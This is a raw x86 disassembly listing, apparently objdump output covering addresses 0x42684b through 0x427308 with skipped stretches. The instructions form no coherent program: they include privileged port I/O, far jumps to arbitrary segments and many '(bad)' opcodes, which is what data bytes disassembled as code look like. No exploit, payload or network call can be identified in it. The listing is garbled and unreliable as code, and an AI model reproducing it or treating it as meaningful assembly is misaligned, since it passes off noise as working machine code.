  42684b:	add    BYTE PTR [edx-0x6b],dl
  42684e:	dec    edx
  42684f:	jnp    0x42684e
  426851:	pusha  
  426852:	ss in  al,dx
  426854:	fstp   TBYTE PTR [esi-0x3efce4c7]
  42685a:	inc    esi
  42685b:	push   ebp
  42685c:	or     al,0x85
  42685e:	inc    edx
  42685f:	or     ah,cl
  426861:	xchg   esi,eax
  426862:	cmp    esi,DWORD PTR [esp+edx*8+0x5a9a14ab]
  426869:	sub    BYTE PTR [esi],cl
  42686b:	pop    es
  42686c:	bound  esi,QWORD PTR [ecx-0x3163d9a1]
  426872:	add    BYTE PTR [ebp+0x7a],dl
  426875:	sbb    eax,0xa74a4ace
  42687a:	mov    edx,0xcac8a4b7
  42687f:	dec    esi
  426880:	or     DWORD PTR [edi*4-0x4811d64e],esi
  426887:	cmp    edx,DWORD PTR [edx]
  426889:	add    al,0x4
  42688b:	es jno 0x426863
  42688e:	in     al,dx
  42688f:	inc    esi
  426890:	sbb    cl,BYTE PTR [eax]
  426892:	mov    edx,edi
  426894:	inc    ebp
  426895:	jb     0x426900
  426897:	push   edi
  426898:	not    DWORD PTR [edx+0x3f]
  42689b:	addr16 ret 
  42689d:	xchg   ecx,eax
  42689e:	popa   
  42689f:	mov    al,ds:0xe1f728f9
  4268a4:	in     al,dx
  4268a5:	jnp    0x4268a8
  4268a7:	mov    esp,DWORD PTR [eax-0x47]
  4268aa:	test   al,0x81
  4268ac:	addr16 pop ss
  4268ae:	xlat   BYTE PTR ds:[ebx]
  4268af:	xor    dl,BYTE PTR [eax-0x2940e7e9]
  4268b5:	jp     0x4268cf
  4268b7:	inc    ebx
  4268b8:	mov    eax,ds:0xcc51834
  4268bd:	clc    
  4268be:	sub    eax,0xeb16c093
  4268c3:	outs   dx,BYTE PTR ds:[esi]
  4268c4:	adc    cl,ch
  4268c6:	imul   esi,DWORD PTR [esi+ebp*8-0x21],0xffffffce
  4268cb:	push   edi
  4268cc:	jg     0x4268bf
  4268ce:	enter  0x5618,0x84
  4268d2:	inc    edx
  4268d3:	and    dh,BYTE PTR [eax]
  4268d5:	push   ebx
  4268d6:	stc    
  4268d7:	in     al,0x9
  4268d9:	test   DWORD PTR ds:0x1a5c6514,ebp
  4268df:	push   0xb83d495d
  4268e4:	mov    bh,0x1d
  4268e6:	jecxz  0x42691a
  4268e8:	jnp    0x4268e9
  4268ea:	cmp    ah,al
  4268ec:	push   edi
  4268ed:	xchg   edi,eax
  4268ee:	jno    0x426947
  4268f0:	sahf   
  4268f1:	nop
  4268f2:	call   0xa93270fb
  4268f7:	aam    0x57
  4268f9:	xor    al,0x7b
  4268fb:	xchg   ecx,eax
  4268fc:	sbb    ah,BYTE PTR [edx-0x77c71516]
  426902:	stc    
  426903:	call   0xb353e506
  426908:	int3   
  426909:	sbb    DWORD PTR [ebp+0x71],ecx
  42690c:	popa   
  42690d:	clc    
  42690e:	int3   
  42690f:	jbe    0x426978
  426911:	stos   BYTE PTR es:[edi],al
  426912:	outs   dx,BYTE PTR ds:[esi]
  426913:	std    
  426914:	lahf   
  426915:	stos   DWORD PTR es:[edi],eax
  426916:	mov    ecx,0x266625e8
  42691b:	scas   al,BYTE PTR es:[edi]
  42691c:	mov    ds:0x205eede5,al
  426921:	adc    DWORD PTR ds:0xc771008,edi
  426927:	sti    
  426928:	mov    cs,WORD PTR [esi-0x1a]
  42692b:	iret   
  42692c:	lahf   
  42692d:	dec    eax
  42692e:	cmp    BYTE PTR [ecx-0x1e],cl
  426931:	push   esi
  426932:	mov    edx,0x1c647763
  426937:	out    dx,al
  426938:	in     eax,dx
  426939:	retf   0xce3a
  42693c:	fist   WORD PTR [ebp-0x55]
  42693f:	add    eax,0x79
	...
  4269b4:	shl    DWORD PTR [ebx+0x4],0x67
  4269b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4269b9:	jcxz   0x4269a3
  4269bc:	jne    0x426978
  4269be:	push   ebp
  4269bf:	inc    esp
  4269c0:	stc    
  4269c1:	cld    
  4269c2:	idiv   DWORD PTR [ebx+0x19a6d]
  4269c8:	cmc    
  4269c9:	add    BYTE PTR [eax],al
  4269cb:	add    BYTE PTR [ecx],ch
  4269cd:	mov    DWORD PTR [esi],esi
  4269cf:	into   
  4269d0:	ss pop es
  4269d2:	mov    dh,0x13
  4269d4:	jmp    DWORD PTR [esi]
  4269d6:	in     eax,0xac
  4269d8:	or     al,BYTE PTR [edx]
  4269da:	inc    esi
  4269db:	xor    DWORD PTR [ebx-0x22],eax
  4269de:	test   DWORD PTR ds:0x2656e73b,eax
  4269e4:	adc    DWORD PTR [edi+0x52],eax
  4269e7:	out    dx,al
  4269e8:	repz inc eax
  4269ea:	or     eax,0x511da5cd
  4269ef:	mov    al,ds:0xcd32d841
  4269f4:	test   BYTE PTR [edi],bh
  4269f6:	out    0xb1,eax
  4269f8:	sub    bl,BYTE PTR [edi]
  4269fa:	push   0xda1cb4c3
  4269ff:	inc    ebx
  426a00:	dec    ebx
  426a01:	sbb    cl,dl
  426a03:	retf   
  426a04:	sub    ah,BYTE PTR gs:[ebx+ebx*4-0x59f0670c]
  426a0c:	mov    edx,0x893a837b
  426a11:	xor    BYTE PTR ds:0x4b909cf1,al
  426a17:	out    dx,eax
  426a18:	fwait
  426a19:	jmp    0x4269db
  426a1b:	push   edx
  426a1c:	jns    0x4269ca
  426a1e:	mov    ebx,ebx
  426a20:	repz xor eax,0x4937a735
  426a26:	push   0x38
  426a28:	ret    0x553d
  426a2b:	dec    eax
  426a2c:	jmp    0x6552:0xeaa869b
  426a33:	ret    
  426a34:	(bad)  
  426a36:	rcl    DWORD PTR [edi-0x686baa31],cl
  426a3c:	cmp    dl,BYTE PTR [ebx-0x5e]
  426a3f:	pop    ds
  426a40:	mov    ?,ecx
  426a42:	in     eax,dx
  426a43:	push   ss
  426a44:	cld    
  426a45:	or     al,0x14
  426a47:	retf   
  426a48:	cmp    al,0x3c
  426a4a:	fnstenv [edi-0x4ac0a01]
  426a50:	ror    BYTE PTR [ebx+eax*2],0xa6
  426a54:	nop
  426a55:	dec    edx
  426a56:	xor    DWORD PTR [ecx-0x5878da88],ecx
  426a5c:	adc    eax,0x70923efc
  426a61:	inc    esp
  426a62:	aas    
  426a63:	mov    ebx,0x4488f2c6
  426a68:	ins    DWORD PTR es:[edi],dx
  426a69:	fdivp  st(1),st
  426a6b:	pop    ebp
  426a6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426a6d:	push   0xa8f66d46
  426a72:	pop    esp
  426a73:	dec    esp
  426a74:	dec    eax
  426a75:	out    0x40,eax
  426a77:	nop
  426a78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426a79:	mov    esi,0xad6f3054
  426a7e:	std    
  426a7f:	pop    ds
  426a80:	inc    ecx
  426a81:	cmp    ch,BYTE PTR [edx]
  426a83:	lahf   
  426a84:	(bad)
  426a87:	sub    al,0xac
  426a89:	sbb    ebx,esi
  426a8b:	and    al,BYTE PTR [ecx]
  426a8d:	or     DWORD PTR [ebx+0x48],0xffffff89
  426a91:	loope  0x426a2b
  426a93:	in     al,dx
  426a94:	mov    bh,0x43
  426a96:	cmc    
  426a97:	loope  0x426a1e
  426a99:	mov    cl,0xdd
  426a9b:	(bad)
  426a9e:	dec    ecx
  426a9f:	push   ecx
  426aa0:	imul   ecx,DWORD PTR [esi-0x4a],0xfffffffe
  426aa4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426aa5:	stos   DWORD PTR es:[edi],eax
  426aa6:	into   
  426aa7:	pop    ebx
  426aa8:	jb     0x426ae6
  426aaa:	imul   ecx,DWORD PTR [ebx],0x44
  426aad:	test   DWORD PTR [esi],edx
  426aaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426ab0:	(bad)  
  426ab1:	jbe    0x426a3a
  426ab3:	inc    ecx
  426ab4:	scas   al,BYTE PTR es:[edi]
  426ab5:	frstor [edi-0x171dba37]
  426abb:	push   es
  426abc:	sbb    edi,ebp
  426abe:	pop    ds
  426abf:	daa    
  426ac0:	xchg   esi,eax
	...
  426b31:	add    BYTE PTR [eax],al
  426b33:	add    ah,al
  426b35:	clc    
  426b36:	jnp    0x426b8e
  426b38:	jg     0x426b11
  426b3a:	in     eax,dx
  426b3b:	cli    
  426b3c:	cwde   
  426b3d:	inc    ebx
  426b3e:	mov    dh,0x90
  426b40:	jl     0x426b91
  426b42:	scas   eax,DWORD PTR es:[edi]
  426b43:	imul   esp,DWORD PTR [edx-0x65],0xf50001
  426b4a:	add    BYTE PTR [eax],al
  426b4c:	std    
  426b4d:	dec    ebp
  426b4e:	pop    eax
  426b4f:	jg     0x426bad
  426b51:	pop    ds
  426b52:	mov    ah,0x6c
  426b54:	xor    BYTE PTR [ebx+ebx*1],bl
  426b57:	sbb    esi,esi
  426b59:	int    0xbd
  426b5b:	les    edi,FWORD PTR [eax+0x39]
  426b5e:	(bad)
  426b61:	cmp    eax,0xac5bebd3
  426b66:	inc    esp
  426b67:	cmc    
  426b68:	repz sub ecx,DWORD PTR ss:[edi+0x16cedca5]
  426b70:	mov    ch,0x92
  426b72:	ficomp WORD PTR [edi-0x74]
  426b75:	xchg   edx,eax
  426b76:	repz jbe 0x426b7d
  426b79:	fimul  WORD PTR [esi-0x4f]
  426b7c:	jge    0x426b90
  426b7e:	adc    DWORD PTR ds:0xdd6e7c87,0x8ea3ebd8
  426b88:	xchg   edi,eax
  426b89:	mov    ah,0xf8
  426b8b:	ins    DWORD PTR es:[edi],dx
  426b8c:	sbb    DWORD PTR [ebx+0x3b],edx
  426b8f:	xor    edi,DWORD PTR [edx]
  426b91:	jae    0x426b7c
  426b93:	call   0x3dbc:0x84230bb1
  426b9a:	lods   al,BYTE PTR ds:[esi]
  426b9b:	pop    edi
  426b9c:	push   esp
  426b9d:	or     cl,BYTE PTR [ecx+ebp*1+0x4b]
  426ba1:	inc    ebx
  426ba2:	add    eax,0x58d73541
  426ba7:	xor    eax,DWORD PTR [eax+0x6448750e]
  426bad:	shr    dh,0x4
  426bb0:	sti    
  426bb1:	fs adc dh,al
  426bb4:	out    dx,al
  426bb5:	rol    DWORD PTR [esi+0x45],cl
  426bb8:	pop    ebp
  426bb9:	stos   BYTE PTR es:[edi],al
  426bba:	jge    0x426b82
  426bbc:	(bad)  
  426bbd:	jbe    0x426bf3
  426bbf:	jp     0x426c27
  426bc1:	mul    BYTE PTR [ebp+0xf7c91d0]
  426bc7:	lods   eax,DWORD PTR ds:[esi]
  426bc8:	mov    edi,0x54948b
  426bcd:	pushf  
  426bce:	jnp    0x426c04
  426bd0:	or     DWORD PTR ds:0x8e406915,edx
  426bd6:	dec    ebp
  426bd7:	sub    DWORD PTR [ebx],edi
  426bd9:	ficomp DWORD PTR [eax]
  426bdb:	outs   dx,DWORD PTR ds:[esi]
  426bdc:	and    DWORD PTR [edi+0xa],esp
  426bdf:	xor    DWORD PTR [ecx-0x1d],0xffffff90
  426be3:	repz sub ebx,DWORD PTR [ecx+edi*2+0x9]
  426be8:	cmp    eax,0xa6c71b9c
  426bed:	xor    DWORD PTR [edx+0x10],edi
  426bf0:	mov    ebp,DWORD PTR ds:0xf73b7d57
  426bf6:	loope  0x426be1
  426bf8:	jmp    DWORD PTR [edi+0x9]
  426bfb:	pop    esi
  426bfc:	test   DWORD PTR [ecx-0x46],edi
  426bff:	adc    BYTE PTR [ebx],0x79
  426c02:	rol    BYTE PTR [eax],1
  426c04:	push   ds
  426c05:	lahf   
  426c06:	pop    eax
  426c07:	pop    esi
  426c08:	sbb    esp,DWORD PTR [edx+0x748279c6]
  426c0e:	stos   DWORD PTR es:[edi],eax
  426c0f:	cmp    eax,0xf31d168f
  426c14:	enter  0xb705,0xb
  426c18:	imul   DWORD PTR [edi]
  426c1a:	mov    gs,WORD PTR [edx+0x52]
  426c1d:	pop    edi
  426c1e:	ficom  WORD PTR [esi+eax*4]
  426c21:	setnp  BYTE PTR [ecx]
  426c24:	in     eax,dx
  426c25:	fsub   QWORD PTR ds:0x50ca5152
  426c2b:	xor    al,0xe1
  426c2d:	test   BYTE PTR [eax-0xc],dl
  426c30:	xlat   BYTE PTR ds:[ebx]
  426c31:	call   0xe57e857a
  426c36:	mov    esi,ebp
  426c38:	loopne 0x426c0d
  426c3a:	mov    esi,DWORD PTR [eax+edi*2+0x1f]
  426c3e:	xor    al,0x23
  426c40:	lock add BYTE PTR [eax],al
	...
  426cb3:	add    bh,bh
  426cb5:	lods   al,BYTE PTR ds:[esi]
  426cb6:	fadd   QWORD PTR [edi]
  426cb8:	fbstp  TBYTE PTR [edi-0x1]
  426cbb:	cld    
  426cbc:	inc    eax
  426cbd:	push   ds
  426cbe:	cdq    
  426cbf:	das    
  426cc0:	scas   eax,DWORD PTR es:[edi]
  426cc1:	push   ecx
  426cc2:	sbb    eax,ecx
  426cc4:	push   edi
  426cc5:	pushf  
  426cc6:	add    DWORD PTR [eax],eax
  426cc8:	cmc    
  426cc9:	add    BYTE PTR [eax],al
  426ccb:	add    BYTE PTR [ebx-0xc],al
  426cce:	sbb    al,0xb5
  426cd0:	and    eax,DWORD PTR [ebp+eiz*8-0x1d85c9f]
  426cd7:	and    al,0x7b
  426cd9:	adc    bl,ch
  426cdb:	mov    ebx,0x31c8dc46
  426ce0:	nop
  426ce1:	cmp    DWORD PTR [eax-0x3ba44f9],eax
  426ce7:	fcomp  QWORD PTR [eax+0x753612cc]
  426ced:	xchg   al,cl
  426cef:	test   DWORD PTR [ebx],esp
  426cf1:	mov    DWORD PTR [edi+ebp*1],ecx
  426cf4:	cmc    
  426cf5:	xchg   DWORD PTR [edi+0x621baf23],edx
  426cfb:	out    dx,eax
  426cfc:	sbb    DWORD PTR [esi],esi
  426cfe:	push   0xffffff81
  426d00:	mov    ds,WORD PTR [esi-0x5018d666]
  426d06:	mov    ch,0xc1
  426d08:	add    eax,0x6e98fcb7
  426d0d:	in     eax,dx
  426d0e:	retf   
  426d0f:	cbw    
  426d11:	enter  0x6a0b,0x4b
  426d15:	adc    BYTE PTR [ebp+0x8623c61],ch
  426d1b:	addr16 out dx,al
  426d1d:	push   edx
  426d1e:	stc    
  426d1f:	xchg   DWORD PTR [ebp+ecx*8-0x375fe931],edx
  426d26:	push   0x1d
  426d28:	push   cs
  426d29:	in     al,dx
  426d2a:	test   eax,0xf4a672d9
  426d2f:	add    al,0xb4
  426d31:	xchg   ecx,eax
  426d32:	hlt    
  426d33:	stc    
  426d34:	mov    edi,0x485f80a1
  426d39:	stc    
  426d3a:	sub    DWORD PTR [eax-0x6f],0xffffffd8
  426d3e:	repz xchg edx,eax
  426d40:	cld    
  426d41:	sbb    bh,bh
  426d43:	scas   al,BYTE PTR es:[edi]
  426d44:	or     BYTE PTR [eax+0x56],bh
  426d47:	xor    DWORD PTR [ebx],eax
  426d49:	shl    DWORD PTR [edi+0x71e0ea44],0xe8
  426d50:	ret    
  426d51:	add    al,0x6f
  426d53:	ds aad 0x94
  426d56:	jmp    0x4419:0x5fc7df49
  426d5d:	jo     0x426d93
  426d5f:	fs (bad) 
  426d61:	popf   
  426d62:	jge    0x426cfc
  426d64:	sub    eax,0xb20f76e9
  426d69:	pop    edi
  426d6a:	test   DWORD PTR [edi+eax*8+0x3c395b35],edi
  426d71:	mov    ebp,0xbfd3b68f
  426d76:	add    ah,BYTE PTR [eax]
  426d78:	adc    ebp,DWORD PTR [ebp+0x3c64759b]
  426d7e:	shr    BYTE PTR [edx],1
  426d80:	scas   eax,DWORD PTR es:[edi]
  426d81:	xchg   edx,eax
  426d82:	imul   DWORD PTR ds:0xae5a3137
  426d88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426d89:	in     al,dx
  426d8a:	sbb    bl,dh
  426d8c:	bound  edi,QWORD PTR [eax+esi*4-0x59]
  426d90:	das    
  426d91:	test   BYTE PTR [esi-0x6100408],0xe8
  426d98:	ds xchg esi,eax
  426d9a:	inc    ebp
  426d9b:	or     eax,0x65de49d3
  426da0:	(bad)  [ecx+0x4ad5422]
  426da6:	xchg   esi,eax
  426da7:	dec    eax
  426da8:	add    al,bh
  426daa:	iret   
  426dab:	and    ax,0xc387
  426daf:	enter  0x678f,0xff
  426db3:	push   cs
  426db4:	fdiv   DWORD PTR [edx-0x2512fb0]
  426dba:	sahf   
  426dbb:	stc    
  426dbc:	sub    ch,ah
  426dbe:	or     BYTE PTR [esp+eiz*8+0x0],bh
	...
  426e31:	add    BYTE PTR [eax],al
  426e33:	add    dh,al
  426e35:	jl     0x426e88
  426e37:	sar    bl,1
  426e39:	std    
  426e3a:	(bad)  
  426e3b:	jle    0x426df9
  426e3d:	(bad)  
  426e3e:	loop   0x426e84
  426e40:	mov    BYTE PTR [ecx-0x62b365c6],al
  426e46:	add    DWORD PTR [eax],eax
  426e48:	cmc    
  426e49:	add    BYTE PTR [eax],al
  426e4b:	add    dh,dh
  426e4d:	jmp    0xdcf0:0xb7db9f02
  426e54:	sbb    BYTE PTR [ecx],dh
  426e56:	sar    DWORD PTR [ebx],cl
  426e58:	add    dh,BYTE PTR [edx-0xe2c9f26]
  426e5e:	jl     0x426e72
  426e60:	pop    ecx
  426e61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426e62:	cdq    
  426e63:	int3   
  426e64:	pop    edi
  426e65:	popf   
  426e66:	das    
  426e67:	mov    ss,WORD PTR [esi+0x3ffe153a]
  426e6d:	or     al,0xe3
  426e6f:	cmp    DWORD PTR [ecx+0x6],ebx
  426e72:	call   0x7a6d:0xd7ba1882
  426e79:	or     esi,ebx
  426e7b:	pop    es
  426e7c:	sbb    al,0x89
  426e7e:	jge    0x426ea0
  426e80:	call   0x66ef:0x46b23034
  426e87:	push   eax
  426e88:	sbb    bh,BYTE PTR [ecx+0x7b57044c]
  426e8e:	inc    esi
  426e8f:	dec    edx
  426e90:	cmp    eax,DWORD PTR [ebp+0x4ab5286d]
  426e96:	xchg   esi,eax
  426e97:	test   dh,0x73
  426e9a:	dec    ebx
  426e9b:	mov    eax,0x5ca5305c
  426ea0:	rcr    BYTE PTR [eax+0x24bf1e10],cl
  426ea6:	xchg   ebp,eax
  426ea7:	mov    esi,0xabf0b9cb
  426eac:	cmp    eax,0x565fdafc
  426eb1:	xchg   ebp,eax
  426eb2:	fisttp WORD PTR es:0x61ede096
  426eb9:	neg    BYTE PTR ds:0x8effc0f8
  426ebf:	mov    bl,0xc7
  426ec1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426ec2:	jae    0x426ef4
  426ec4:	es jmp 0x426e7a
  426ec7:	push   0x6c20c168
  426ecc:	aas    
  426ecd:	retf   0x7941
  426ed0:	icebp  
  426ed1:	push   edi
  426ed2:	push   ecx
  426ed3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426ed4:	test   DWORD PTR [esi],edx
  426ed6:	lods   al,BYTE PTR ds:[esi]
  426ed7:	jecxz  0x426e7e
  426ed9:	dec    ecx
  426eda:	lds    esi,FWORD PTR [ebx]
  426edc:	cmp    ch,BYTE PTR [ebx+0x44]
  426edf:	frstor [ebx]
  426ee1:	sbb    al,0x21
  426ee3:	ror    BYTE PTR [ebx+0x5a],0xe7
  426ee7:	mov    DWORD PTR [ebx],edx
  426ee9:	add    ebx,DWORD PTR [edx]
  426eeb:	jecxz  0x426ed3
  426eed:	sbb    BYTE PTR [ebx+0x4c],ch
  426ef0:	add    ch,BYTE PTR [esi+0x66]
  426ef3:	mov    esi,esp
  426ef5:	pop    ds
  426ef6:	loope  0x426e8e
  426ef8:	(bad)  
  426ef9:	in     eax,0x3f
  426efb:	test   dh,ah
  426efd:	(bad)  
  426efe:	jmp    0x3ac5ff7f
  426f03:	dec    esp
  426f04:	pop    ds
  426f05:	jne    0x426e8e
  426f07:	push   esp
  426f08:	aam    0xe1
  426f0a:	xchg   esi,eax
  426f0b:	mov    al,ds:0x930f651c
  426f10:	das    
  426f11:	in     eax,0x94
  426f13:	repnz mov bl,BYTE PTR [ebx+0x67094af0]
  426f1a:	(bad)  
  426f1b:	or     edi,edi
  426f1d:	cmp    eax,0x5d7f4e9e
  426f22:	and    esi,esi
  426f24:	xchg   esp,eax
  426f25:	ss sbb eax,0xe4a6c54d
  426f2b:	sub    esi,edi
  426f2d:	cdq    
  426f2e:	hlt    
  426f2f:	push   ecx
  426f30:	or     DWORD PTR [edx-0x56],0xf683fa81
  426f37:	xor    BYTE PTR [ecx-0x50],bl
  426f3a:	push   es
  426f3b:	xchg   edi,eax
  426f3c:	repz mov ebx,0x1fe7ec
	...
  426fb2:	add    BYTE PTR [eax],al
  426fb4:	cmp    DWORD PTR [eax-0x6854f9f5],ebx
  426fba:	cmp    eax,0xcc7989bf
  426fbf:	pop    ebx
  426fc0:	repnz mov bl,0x57
  426fc3:	dec    ecx
  426fc4:	inc    ecx
  426fc5:	sahf   
  426fc6:	add    DWORD PTR [eax],eax
  426fc8:	cmc    
  426fc9:	add    BYTE PTR [eax],al
  426fcb:	add    BYTE PTR [ebx+edi*8+0xa],ch
  426fcf:	xchg   esi,eax
  426fd0:	sub    ah,BYTE PTR [bx+si-0x3c91]
  426fd5:	xor    al,0xb2
  426fd7:	test   al,0xee
  426fd9:	test   eax,0x391baf44
  426fde:	enter  0xd30a,0x38
  426fe2:	int    0xc8
  426fe4:	sub    ebp,DWORD PTR [ecx-0x27]
  426fe7:	js     0x42705f
  426fe9:	loopne 0x427060
  426feb:	pmulhw mm4,mm2
  426fee:	mov    eax,ds:0x203237d
  426ff3:	jecxz  0x427062
  426ff5:	(bad)  
  426ff6:	or     DWORD PTR [eax-0x13],ebx
  426ff9:	push   esi
  426ffa:	inc    ebp
  426ffb:	fdivp  st(5),st
  426ffd:	test   al,0x6a
  426fff:	stc    
  427000:	and    ah,bl
  427002:	gs jb  0x426fa3
  427005:	push   ecx
  427006:	jmp    0x76675330
  42700b:	mov    cl,0xd6
  42700d:	nop
  42700e:	push   edx
  42700f:	aad    0x9
  427011:	into   
  427012:	pop    edx
  427013:	fidiv  DWORD PTR [ebp-0x523d31b2]
  427019:	call   0x1829:0x41784b31
  427020:	imul   ecx,DWORD PTR [ecx-0x6df7a202],0xc08cc6b0
  42702a:	push   esi
  42702b:	mov    esp,0xbe4d225f
  427030:	mov    esp,0xf7b5e2c0
  427035:	adc    al,0x47
  427037:	cmp    al,0x57
  427039:	pop    ds
  42703a:	imul   eax,DWORD PTR [eax+ecx*4+0x58608c54],0xffffffd1
  427042:	fld    QWORD PTR [eax]
  427044:	cmp    eax,0x4f404d9e
  427049:	test   BYTE PTR ds:0x7b33d30,0x69
  427050:	fidiv  DWORD PTR [ecx+0x71]
  427053:	dec    eax
  427054:	sub    BYTE PTR [edx+edx*2+0x36],bh
  427058:	push   cs
  427059:	loopne 0x427057
  42705b:	and    al,0x4c
  42705d:	nop
  42705e:	xor    BYTE PTR [edx-0x557a8d7f],dl
  427064:	neg    DWORD PTR [edx-0x4]
  427067:	push   esi
  427068:	repz dec esp
  42706a:	repz add ecx,eax
  42706d:	dec    edx
  42706e:	ficom  WORD PTR [ecx]
  427070:	pop    ebx
  427071:	xor    DWORD PTR [ebp-0x23c8482c],ebp
  427077:	add    cl,BYTE PTR [edx-0x2f]
  42707a:	xchg   ebx,eax
  42707b:	inc    edx
  42707c:	or     ebp,DWORD PTR [esi+ebx*2+0x1d]
  427080:	lods   eax,DWORD PTR ds:[esi]
  427081:	lahf   
  427082:	pop    eax
  427083:	in     al,0x59
  427085:	sbb    ecx,DWORD PTR [ebp+eiz*2+0x13]
  427089:	cmp    dh,BYTE PTR [esi+0x4f]
  42708c:	push   eax
  42708d:	dec    ebx
  42708e:	push   eax
  42708f:	dec    ebx
  427090:	mov    WORD PTR [ebp+ecx*2+0x4984af32],gs
  427097:	call   0xe89a:0x6f8ef388
  42709e:	dec    esi
  42709f:	clc    
  4270a0:	xor    dl,BYTE PTR [eax+0x38ee7554]
  4270a6:	fldenv [ecx+0x60]
  4270a9:	inc    esi
  4270aa:	mov    cl,0xe3
  4270ac:	jae    0x427043
  4270ae:	stos   BYTE PTR es:[edi],al
  4270af:	xchg   edi,eax
  4270b0:	(bad)  
  4270b1:	scas   eax,DWORD PTR es:[edi]
  4270b2:	jle    0x427037
  4270b4:	fwait
  4270b5:	std    
  4270b6:	out    dx,al
  4270b7:	sub    al,0xc5
  4270b9:	mul    BYTE PTR [ebp-0x15]
  4270bc:	fld    TBYTE PTR [ecx]
  4270be:	cmp    ecx,DWORD PTR [edi]
  4270c0:	mov    WORD PTR [eax],es
	...
  427132:	add    BYTE PTR [eax],al
  427134:	fwait
  427135:	and    DWORD PTR [edi],ecx
  427137:	popa   
  427138:	mov    edi,0xcefbff6f
  42713d:	aad    0x24
  42713f:	aam    0x75
  427141:	bswap  eax
  427143:	inc    ebx
  427144:	ss lahf 
  427146:	add    DWORD PTR [eax],eax
  427148:	cmc    
  427149:	add    BYTE PTR [eax],al
  42714b:	add    BYTE PTR [edx+0x1],ah
  42714e:	xor    cl,BYTE PTR [ebx+0x7a]
  427151:	and    cl,BYTE PTR [eax+0x16507a7f]
  427157:	xchg   edx,eax
  427158:	mov    ebp,0x3e9a5d47
  42715d:	fidivr DWORD PTR [eax-0x3e9f97da]
  427163:	ins    DWORD PTR es:[edi],dx
  427164:	test   eax,0x1703524e
  427169:	xchg   edx,eax
  42716a:	adc    esi,DWORD PTR [edx]
  42716c:	sub    esp,DWORD PTR [edi]
  42716e:	push   ebx
  42716f:	inc    esi
  427170:	fnstcw WORD PTR cs:[ecx+0x61825ed8]
  427177:	add    edi,DWORD PTR gs:[ecx+0x490e76e6]
  42717e:	cmp    esp,DWORD PTR [edi+0x72]
  427181:	or     al,0x39
  427183:	dec    esi
  427184:	loope  0x4271f9
  427186:	push   es
  427187:	fiadd  DWORD PTR ds:0x11c40f5d
  42718d:	mov    WORD PTR [ebp+0x5d],cs
  427190:	inc    ebx
  427191:	mov    cl,0x40
  427193:	push   eax
  427194:	nop
  427195:	les    edi,FWORD PTR [ecx+0x5a8213d8]
  42719b:	mov    al,ds:0xc2df6471
  4271a0:	xchg   edx,eax
  4271a1:	mov    BYTE PTR [edx+0x4b079b2c],0xf4
  4271a8:	inc    edx
  4271a9:	out    0xc,al
  4271ab:	int    0x39
  4271ad:	xchg   ebp,eax
  4271ae:	push   ds
  4271af:	imul   ecx,DWORD PTR [eax+0x0],0xc9619490
  4271b6:	adc    eax,0x35ef33c
  4271bb:	int    0x59
  4271bd:	ins    DWORD PTR es:[edi],dx
  4271be:	adc    DWORD PTR [ecx+0x753ec000],0xffffffdf
  4271c5:	or     esi,esi
  4271c7:	popa   
  4271c8:	sbb    eax,0xa087fb07
  4271cd:	call   0xe12d391c
  4271d2:	push   ebx
  4271d3:	xchg   esp,eax
  4271d4:	sub    eax,0xe3eb93e7
  4271d9:	push   esp
  4271da:	sub    DWORD PTR [eax-0x7d2f783b],edi
  4271e0:	push   esp
  4271e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4271e2:	icebp  
  4271e3:	fidivr DWORD PTR [eax+esi*2+0x1a]
  4271e7:	stos   DWORD PTR es:[edi],eax
  4271e8:	mov    WORD PTR [esi],ss
  4271ea:	enter  0xb60c,0x1a
  4271ee:	and    al,0xc4
  4271f0:	push   eax
  4271f1:	addr16 push ds
  4271f3:	ret    0x6022
  4271f6:	adc    eax,eax
  4271f8:	mov    esi,0xc63fd3a
  4271fd:	outs   dx,BYTE PTR ds:[esi]
  4271fe:	test   eax,0x6772a2e8
  427203:	leave  
  427204:	xor    al,al
  427206:	div    DWORD PTR [ecx-0x4a7f8436]
  42720c:	jmp    0xbde558c9
  427211:	and    eax,0x16ec938a
  427216:	lods   eax,DWORD PTR ds:[esi]
  427217:	aam    0x77
  427219:	push   0xf
  42721b:	nop
  42721c:	mov    ch,0x16
  42721e:	mov    ebx,0xc7d1e8f0
  427223:	or     edx,DWORD PTR [esi-0x3]
  427226:	adc    ecx,DWORD PTR [esi+esi*4+0x2a]
  42722a:	xor    BYTE PTR [esi],0xff
  42722d:	push   cs
  42722e:	ds cli 
  427230:	retf   0xa185
  427233:	mov    ch,0xa0
  427235:	aaa    
  427236:	mov    ds:0x4e1ec637,al
  42723b:	xor    BYTE PTR [ebx+0x694975cd],bl
	...
  4272b1:	add    BYTE PTR [eax],al
  4272b3:	add    BYTE PTR [ebp+eiz*1-0x73],dl
  4272b7:	dec    esi
  4272b8:	std    
  4272b9:	out    dx,al
  4272ba:	xlat   BYTE PTR ds:[ebx]
  4272bb:	aas    
  4272bc:	jle    0x427280
  4272be:	ds jmp 0x6e8c9986
  4272c4:	sub    esp,DWORD PTR [eax+0xf50001]
  4272ca:	add    BYTE PTR [eax],al
  4272cc:	jle    0x42732d
  4272ce:	repz cli 
  4272d0:	aam    0xa7
  4272d2:	ret    0x45e1
  4272d5:	call   0xd499:0xca3c3480
  4272dc:	out    dx,al
  4272dd:	(bad)  
  4272e0:	(bad)  
  4272e1:	fucomi st,st(6)
  4272e3:	jmp    0x427333
  4272e5:	gs adc al,0x50
  4272e8:	push   cs
  4272e9:	xchg   edi,eax
  4272ea:	cmp    esi,edi
  4272ec:	mov    ch,0xad
  4272ee:	sbb    al,0xa3
  4272f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4272f1:	out    0x65,eax
  4272f3:	jbe    0x42734f
  4272f5:	dec    si
  4272f7:	mov    esi,0x55c41d04
  4272fc:	mov    dl,0x80
  4272fe:	ds xor al,0x0
  427301:	jmp    0x427366
  427303:	mov    ah,0xbf
  427305:	jb     0x4272c3
  427307:	cli    
  427308:	or     dl,BYTE PTR [ecx+0xd9237e5]
